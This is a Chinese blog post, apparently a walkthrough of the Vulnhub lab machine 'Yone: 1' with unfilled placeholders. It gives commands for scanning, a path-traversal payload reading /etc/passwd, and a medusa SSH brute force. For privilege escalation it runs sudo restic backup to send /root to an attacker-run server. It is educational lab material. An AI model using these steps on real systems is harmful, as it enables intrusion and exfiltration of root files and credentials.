---
title: Yone
published: 2026-08-17
description: 对 Vulnhub 平台 [靶机名称] 靶机的完整渗透测试记录，涵盖信息收集、漏洞利用与提权全过程。
image: ./images/Pasted image 20260817205019.png
tags:
  - Vulnhub
  - 渗透测试
  - 靶机
  - 提权
category: Vulnhub
draft: false
pinned: false
lang: zh-CN
author: Ynm
comment: true
---

| **项目**         | **详情**                                                                  |
| -------------- | ----------------------------------------------------------------------- |
| **靶机名称**       | Yone: 1                                                                 |
| **难度等级**       | Medium（中等）                                                              |
| **目标**         | 获取 root 权限并找到 `/root` 目录下的 flag                                         |
| **下载链接**       | [Yone.ova (1.7 GB)](https://www.vulnhub.com/entry/yone-1,543/#download) |
| **攻击机 (Kali)** | `192.168.197.10`（建议使用 NAT 模式）                                           |
| **靶机 (Yone)**  | `[靶机IP]`（DHCP 自动分配）                                                     |

![](images/Pasted%20image%2020260817205209.png)
## 一、 信息收集 (Reconnaissance)

*信息收集是渗透测试的基石，决定了后续攻击面的广度。*

### 1.1 主机发现
使用 `netdiscover` 或 `arp-scan` 在本地网络中定位靶机 IP。

```
sudo netdiscover -r 192.168.1.0/24
# 或者
sudo arp-scan --localnet


结果输出：
> 发现目标 IP 为：`[靶机IP]`

### 2.2 端口与服务扫描
使用 Nmap 对靶机进行全面的端口和服务扫描。

```bash
nmap -p- --min-rate 1000 [靶机IP]        # 快速全端口扫描
nmap -p [开放端口] -sV -sC -O [靶机IP]   # 深入服务探测
```

**扫描结果分析**：

| 端口 | 服务 | 状态 | 初步判断 |
| :--- | :--- | :--- | :--- |
| 22 | SSH | 开放 | 可能存在爆破或密钥泄露风险 |
| 80 | HTTP | 开放 | 主要 Web 攻击面 |

---

## 三、 Web 渗透 (Web Penetration)

*Web 服务通常是突破口，需要细致地挖掘每一个细节。*

### 3.1 绑定 Hosts 文件
直接访问 IP 的 80 端口，发现图片无法显示。查看图片地址，发现其指向了一个域名 `yone.lc`。

这意味着我们需要在攻击机的 `/etc/hosts` 文件中手动添加域名解析。

```bash
sudo echo "[靶机IP]    yone.lc" >> /etc/hosts
```

### 3.2 网站功能探索
使用域名 `http://yone.lc` 访问网站，发现这是一个可以**注册新用户**的 Web 应用。

**操作步骤**：
1.  注册一个新账号并登录。
2.  登录后，首页是一个**文件上传**页面，并且已经存在两个上传过的图片。

### 3.3 发现路径遍历漏洞 (Path Traversal)
点击其中一张图片，发现 URL 中存在一个参数 `link`：
`http://yone.lc/download?link=right.jpg`

这是一个典型的文件下载功能，可以尝试进行**路径遍历攻击**，读取系统敏感文件。

**验证 Payload**：
`http://yone.lc/download?link=../../../../../../../../etc/passwd`

**结果**：
成功读取到 `/etc/passwd` 文件，确认存在路径遍历漏洞。

在 `/etc/passwd` 文件中，我们注意到一个本地用户 `yone`。

---

## 四、 获取初始 Shell (Initial Access)

*既然已知系统存在用户 `yone` 且 SSH 服务开启，最直接的方式就是进行密码爆破。*

### 4.1 SSH 密码爆破
使用 `medusa` 对 `yone` 用户进行 SSH 密码爆破。

> **为什么用 Medusa？** 资料显示 `hydra` 在此场景下可能比较卡顿，因此推荐使用 `medusa`。

```bash
medusa -u yone -P [密码字典路径] -h [靶机IP] -M ssh -F -t 10
```
**参数说明**：
- `-u yone`：指定单一用户名。
- `-P`：指定密码字典文件。
- `-h`：指定目标主机 IP。
- `-M ssh`：指定爆破的服务为 SSH。
- `-F`：一旦找到正确的密码就停止爆破。
- `-t 10`：指定线程数为 10。

**爆破结果**：
> 用户名：`yone`
> 密码：`12345qwert`

### 4.2 连接 SSH
使用获取到的凭据成功登录 SSH。

```bash
ssh yone@[靶机IP]
```

**获得的权限**：
```plaintext
yone@ubuntu:~$ id
uid=1000(yone) gid=1000(yone) groups=1000(yone)
```

---

## 五、 权限提升 (Privilege Escalation)

*现在的目标是从普通用户 `yone` 提权至 `root`。*

### 5.1 检查 Sudo 权限
输入 `sudo -l` 查看当前用户能以 root 权限执行哪些命令，且无需密码。

```bash
sudo -l
```

**关键发现**：
用户可以无密码地以 root 权限执行 `/usr/bin/restic backup -r rest*`。

### 5.2 利用 Restic 提权
`restic` 是一个备份程序。如果我们可以控制 `restic` 的备份目标，就能利用它以 root 权限读取任意文件。

**攻击思路**：在攻击者控制的服务器上搭建一个 `restic` 服务端，然后让靶机上的 `restic` 以 root 权限将敏感文件（如 `/root/flag.txt` 或 `/etc/shadow`）备份到我们的服务器上。

#### 步骤 1：在攻击机（或公网服务器）上搭建 Restic Server
由于靶机可能无法主动连接内网，建议使用具有公网 IP 的云服务器。

```bash
# 安装 Golang 和 Restic
apt-get install golang restic

# 克隆并编译 rest-server
git clone https://github.com/restic/rest-server.git
cd rest-server
export GOPROXY="https://goproxy.cn"
CGO_ENABLED=0 go build -o rest-server ./cmd/rest-server

# 启动服务（注意：--no-auth 表示无认证，仅用于实验环境）
./rest-server --no-auth
```
*默认监听端口为 8000*。

#### 步骤 2：在靶机上初始化备份仓库
在靶机 (`yone`) 上，使用 `restic` 客户端初始化一个指向我们服务器的仓库，并设置密码。

```bash
restic -r rest:http://[你的服务器IP]:8000/rest1 init
```
*此处密码设置为 `123456`*。

#### 步骤 3：以 Root 权限备份敏感文件
现在，使用 `sudo` 以 root 权限执行 `restic backup` 命令，将 `/root` 目录备份到我们的服务器。

```bash
sudo /usr/bin/restic backup -r rest:http://[你的服务器IP]:8000/rest1 /root
```
*或者，也可以选择备份 `/etc/shadow` 文件进行离线破解*。

### 5.3 获取 Flag
在攻击机的 Restic 服务器上，可以通过 `restic` 命令查看并恢复备份文件，从而获取 flag。

```bash
# 在攻击机上，列出备份快照
restic -r rest:http://[你的服务器IP]:8000/rest1 snapshots

# 挂载或恢复备份文件，查看 flag
restic -r rest:http://[你的服务器IP]:8000/rest1 mount /mnt/restic
cat /mnt/restic/[快照ID]/root/flag.txt
```

**Flag 内容**：
```plaintext
[粘贴 Flag 内容]
```

---

## 六、 总结与复盘

### 6.1 攻击路径总结
1.  **信息收集**：通过端口扫描发现 22 和 80 端口。
2.  **Web 侦察**：发现域名 `yone.lc` 并绑定 hosts，注册账号探索功能。
3.  **漏洞发现**：在文件下载功能点发现路径遍历漏洞，读取 `/etc/passwd`。
4.  **获取 Shell**：利用读取到的用户名 `yone`，通过 Medusa 爆破 SSH 密码获取初始访问权。
5.  **权限提升**：通过 `sudo -l` 发现 `restic` 命令的滥用机会，搭建服务端，利用备份功能窃取 root 敏感文件。

### 6.2 心得与思考
- **路径遍历的威力**：一个简单的路径遍历漏洞，配合信息收集，成为了整个渗透测试的突破口。
- **SUDO 配置的重要性**：错误地配置 `sudoers` 文件，允许普通用户以 root 权限执行备份工具，是导致提权成功的根本原因。
- **Living off the land**：提权阶段利用了系统自带的工具 (`restic`)，而没有使用复杂的漏洞利用脚本，这是一种非常优雅且不易被察觉的攻击方式。

---

> ✍️ **写在最后**：Yone 靶机完美地诠释了“渗透测试是信息收集的艺术”这一理念。从绑定 hosts 到发现路径遍历，再到巧妙地利用 `restic` 提权，每一步都环环相扣，非常考验渗透测试人员的细心与思路拓展能力。
```